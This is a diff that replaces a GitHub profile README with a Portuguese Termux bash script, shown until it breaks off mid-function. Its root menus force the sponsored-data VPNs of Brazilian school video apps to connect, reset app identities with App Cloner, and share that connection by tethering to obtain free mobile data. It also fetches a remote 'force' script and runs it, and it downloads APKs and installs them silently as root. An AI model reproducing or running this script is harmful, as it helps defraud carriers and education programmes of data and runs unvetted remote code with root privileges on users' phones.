@@ -1,16 +1,2780 @@
-### Hi there 👋
 
-<!--
-**Wellingtonbnm2/Wellingtonbnm2** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+#!/bin/bash
+clear
 
-Here are some ideas to get you started:
+VermelhoAll='\e[01;37;41m'
+NADA='\033[0m'
+CINZA='\e[02;37m'
+DESTACAR='\e[01;37m'
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+SCOLOR='\033[0m'
+SEMCOR='\033[8m'
+MenuPrincipal(){
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "                MENU PRINCIPAL     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ===================================" 
+echo -e "            ${DESTACAR}[ 1 ] - Apps Escola ${CINZA}ROOT${NADA}"
+echo -e "            ${DESTACAR}[ 2 ] - Rotear VPN ${CINZA}ROOT${NADA}"
+echo -e "            ${DESTACAR}[ 3 ] - Outros"
+echo -e "            ${DESTACAR}[ 4 ] - X9 de Arquivos ${CINZA}ROOT${NADA}"
+echo -e "            ${DESTACAR}[ 5 ] - MBs Free"
+echo -e "            ${DESTACAR}[ 6 ] - Atualizar"
+echo -e "            ${DESTACAR}[ 0 ] - Sair${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in  
+    1)Menu1;;
+    2)Menu2;;
+    3)Menu3;;
+    4)Menu4;;
+    5)Menu5;;
+    6)Menu6;;
+    0)killall com.termux ; exit;;
+    *) echo ; MenuPrincipal;;
+    esac
+     }
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+Menu6(){ 
+clear
+echo -e "LIGUE A INTERNET"
+echo
+read -n1 -p "DIGITE Y DEPOIS DE LIGAR" optione12 ; case $optione12 in 
+  y)curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/force && chmod +x force && cp force $PREFIX/bin/ ; clear ; echo -e "SCRIPT ATUALIZADO COM SUCESSO"; sleep 5 ;./force;;
+  Y)curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/force && chmod +x force && cp force $PREFIX/bin/ ; clear ; echo -e "SCRIPT ATUALIZADO COM SUCESSO"; sleep 5 ; ./force;;
+  *)Menu6;;
+  esac
+}
+Menu1() {
+check() {
+    su=$(su -h | grep -c "command")
+    case $su in
+    0) killall com.termux ; clear ; exit ;;
+    1) clear;;
+    esac
+}
+echo -e '\n'
+check
+    clear
+echo "     ==================================="
+echo "             FORÇAR CONEXÃO (ROOT)     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - CMSP"
+echo -e "            [ 2 ] - CMSP KIDS"
+echo -e "            [ 3 ] - Aulas Parana"
+echo -e "            [ 4 ] - Applique-se"
+echo -e "            [ 5 ] - Rio Educa Em Casa"  
+echo -e "            [ 6 ] - Permições VPN"
+echo -e "            [ 7 ] - Loop De Conexão"
+echo -e "            [ 8 ] - Conexão Alternativa"
+echo -e "            [ 9 ] - Baixar Apps"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in  
+   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
+    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
+    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";; 
+    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
+   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
+    6) PermiçõesVPN;;
+    7) LoopDeConexão;;
+    8) ConexãoAuternativa;;
+    9) BaixarApps;;
+    0) MenuPrincipal;;
+    *) echo ; Menu1;;
+    esac
+    connect
+    }
+
+
+
+ConexãoAuternativa(){
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "             FORÇAR CONEXÃO (ROOT)     "
+echo "        ==================================="
+echo "            USE ESSE CASO O OUTRO"
+echo "            NÃO ESTEJA FUNCIONANDO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - CMSP"
+echo -e "            [ 2 ] - CMSP KIDS"
+echo -e "            [ 3 ] - Aulas Parana"
+echo -e "            [ 4 ] - Applique-se"
+echo -e "            [ 5 ] - Rio Educa Em Casa"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in  
+   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
+    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
+    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";; 
+    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
+   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
+    0) Menu1;;
+    *) echo ; ConexãoAuternativa;;
+    esac
+    connectodd
+    }
+
+connectodd(){
+clear
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name $App --ez delete_app_data true && sleep 10 && clear && su -c pm clear $App && $A4 && sleep 4 && $A3
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) sleep 2 ; check2;;
+    1)  su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && su -c am start -n com.termux/com.termux.HomeActivity && clear && su -c am startservice -n $App/tv.ip.my.controller.MyMainService && su -c am stopservice -n $App/tv.ip.my.controller.MyMainService && su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && sleep 4 && su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && sleep 1 ; clear ; echo "AGORA REMOVA O APP DE RECENTES" && sleep 10 && su -c killall $App
+     esac
+}
+check2
+su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && su -c killall com.termux
+}
+
+PermiçõesVPN(){
+    clear
+echo -e '\n'
+echo "      ==================================="
+echo "              FORÇAR CONEXÃO (ROOT)     "
+echo "         ==================================="
+echo "               ESCOLHA UM APP PARA"
+echo "               PEDIR PERMIÇÕES VPN"
+echo 
+echo "         ==================================="
+echo -e "             ${DESTACAR}[ 1 ] - CMSP"
+echo -e "             [ 2 ] - CMSP KIDS"
+echo -e "             [ 3 ] - Aulas Parana"
+echo -e "             [ 4 ] - Applique-se"
+echo -e "             [ 5 ] - Rio Educa Em Casa"  
+echo -e "             [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in  
+   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
+    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
+    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";; 
+    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
+   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
+    0) Menu1;;
+    *) echo ; PermiçõesVPN;;
+    esac
+    connectid
+    }
+
+
+connectid () {
+clear
+su -c am start -n $App/tv.ip.my.activities.PermissionActivity && sleep 2 && $A2 && sleep 6 && su -c pm clear $App && Menu1
+}
+
+LoopDeConexão(){
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "             LOOP DE CONEXÃO (ROOT)     "
+echo "        ==================================="
+echo "                 ESCOLHA UM APP"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - CMSP"
+echo -e "            [ 2 ] - CMSP KIDS"
+echo -e "            [ 3 ] - Aulas Parana"
+echo -e "            [ 4 ] - Applique-se"
+echo -e "            [ 5 ] - Rio Educa Em Casa"  
+echo -e "            [ 6 ] - Todos os apps"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in  
+   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
+    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
+    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";;
+    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
+   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
+    6) App6;;
+    0) Menu1;;
+    *) echo ; LoopDeConexão;;
+    esac
+    connected
+    }
+
+
+App6(){
+clear 
+echo "PARA FUNCIONAR CORRETAMENTE É NECESSARIO" ; echo "TER TODOS OS APPS DE CONEXÃO FORÇADA," ; echo "DEIXAR O TERMUX EM SEGUNDO PLANO" ;  sleep 10 && clear && echo "PEDINDO AS PERMIÇÕES DE VPN DE" ; echo "TODOS OS APPS, POR FAVOR ACEITE" &&
+su -c am start -n tv.ip.edusp/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.edusp && su -c am start -n tv.ip.cmspi/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.cmspi && su -c am start -n tv.ip.aulapr/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.aulapr && su -c am start -n tv.ip.appliquese/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.appliquese && su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.edusp --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.edusp && su -c am start -n tv.ip.edusp/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.edusp/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 && sleep 40
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) clear;;
+    1) su -c killall tv.ip.edusp;;
+     esac
+}
+check2
+check3() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) sleep 2 ; check3;;
+    0) su -c pm clear tv.ip.edusp && clear;;
+     esac
+}
+check3
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.cmspi --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.cmspi && su -c am start -n tv.ip.cmspi/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.cmspi/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity && sleep 40
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) clear;;
+    1) su -c killall tv.ip.cmspi;;
+     esac
+}
+check2
+check3() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) sleep 2 ; check3;;
+    0) su -c pm clear tv.ip.cmspi && clear;;
+     esac
+}
+check3
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.aulapr --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.aulapr && su -c am start -n tv.ip.aulapr/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.aulapr/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 && sleep 40
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) clear;;
+    1) su -c killall tv.ip.aulapr;;
+     esac
+}
+check2
+check3() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) sleep 2 ; check3;;
+    0) su -c pm clear tv.ip.aulapr && clear;;
+     esac
+}
+check3
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.appliquese --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.appliquese && su -c am start -n tv.ip.appliquese/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.appliquese/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2 && sleep 40
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) clear;;
+    1) su -c killall tv.ip.appliquese;;
+     esac
+}
+check2
+check3() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) sleep 2 ; check3;;
+    0) su -c pm clear tv.ip.appliquese && clear;;
+     esac
+}
+check3
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.rioeduca --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.rioeduca && su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.rioeduca/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2 && sleep 40 
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) clear;;
+    1) su -c killall tv.ip.rioeduca;;
+     esac
+}
+check2
+check3() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) sleep 2 ; check3;;
+    0) su -c pm clear tv.ip.rioeduca && clear;;
+     esac
+}
+check3
+clear && App6
+}
+
+
+connected() {
+clear
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name $App --ez delete_app_data true && sleep 10 && sleep 18 && clear && su -c pm clear $App && su -c am start -n $App/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n $App/tv.ip.my.controller.MyMainService && $A3
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) sleep 2 ; check2;;
+    1) su -c am stopservice -n $App/tv.ip.my.controller.MyMainService && su -c killall $App
+     esac
+}
+check2
+check9() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) connected;;
+    1) sleep 2 ; check9;;
+     esac
+}
+check9
+}
+
+BaixarApps(){
+clear
+echo -e '\n'
+echo "      ==================================="
+echo "               FORÇAR CONEXÃO (ROOT)     "
+echo "         ==================================="
+echo "           ESCOLHA UM APP PARA BAIXAR"
+echo
+echo "         ==================================="
+echo -e "             ${DESTACAR}[ 1 ] - CMSP"
+echo -e "             [ 2 ] - Rio Educa Em Casa"
+echo -e "             [ 3 ] - Aulas Parana"
+echo -e "             [ 4 ] - Applique-se" 
+echo -e "             [ 5 ] - CMSP Kids"
+echo -e "             [ 0 ] - Voltar${NADA}"
+echo "        ==================================="
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in  
+    1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2" ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";E1="17";;
+    2) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca"; E1="18";;
+    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2" ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr"; E1="19";;
+    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese"; E1="20";;
+     5) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi" ; E1="22";;
+    0) Menu1;;
+    *) BaixarApps;;
+    esac
+    connectar
+}
+
+connectar () {
+clear
+check(){
+      appk=$(test -f "$HOME/$E1.apk" && echo 1)
+    case $appk in
+    1) su -c rm -f $HOME/$E1.apk && clear;;
+    *) echo "BAIXANDO..." ; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/$E1.apk && chmod +x $E1.apk && clear && echo "BAIXADO COM SUCESSO!" ; sleep 3 && clear  ;;
+    esac
+}
+check
+check(){
+      apps=$(test -d "/data/data/$App" && echo 1)
+    case $apps in
+    1) echo "DESINSTALANDO SEU APP..." && su -c pm uninstall $App && echo ; echo "INSTALANDO O NOVO APP..." ; su -c pm install $HOME/$E1.apk ;;
+    *) echo "INSTALANDO O NOVO APP..." ; su -c pm install $HOME/$E1.apk;;
+     esac
+}
+check
+check(){
+      apps=$(test -d "/data/data/$App" && echo 1)
+    case $apps in
+    1) clear;;
+    *) termux-open $HOME/$E1.apk;;
+     esac
+}
+check
+Menu1
+}
+
+connect(){
+clear
+su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name $App --ez delete_app_data true && sleep 10 && clear && su -c pm clear $App && su -c am start -n $App/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n $App/tv.ip.my.controller.MyMainService && $A3
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) sleep 2 ; check2;;
+    1) su -c am stopservice -n $App/tv.ip.my.controller.MyMainService && su -c killall $App
+     esac
+}
+check2
+su -c killall com.termux
+}
+
+
+Menu2() {
+    clear
+echo -e '\n'
+echo "     ==================================="
+echo "               ROTEAR VPN (ROOT)     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Via Roteador Wi-Fi"
+echo -e "            [ 2 ] - Via USB"
+echo -e "            [ 3 ] - Via Bluetooth"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+   1)WIFI;;
+   2)USB;;
+   3)Bluetooth;;
+   0) MenuPrincipal;;
+   *) Menu2;;
+    esac
+    }
+
+WIFI(){
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "              VIA ROTEADOR WI-FI     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Metodo 1"
+echo -e "            [ 2 ] - Metodo 2"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+    1)MetodoWIFI1;;
+    2)MetodoWIFI2;;
+    0)Menu2;;
+    *)WIFI;;
+     esac
+     }
+
+
+MetodoWIFI1(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+su -c 'svc wifi disable' && sleep 4
+check1() {
+    vpn=$(su -c ifconfig | grep -c wlan0)
+    case $vpn in
+    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 2" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+check5(){
+      apps=$(cat wifiip1 | grep -c .)
+    case $apps in
+     1) clear;;
+     2)clear;;
+     3)clear;;
+     4)clear;;
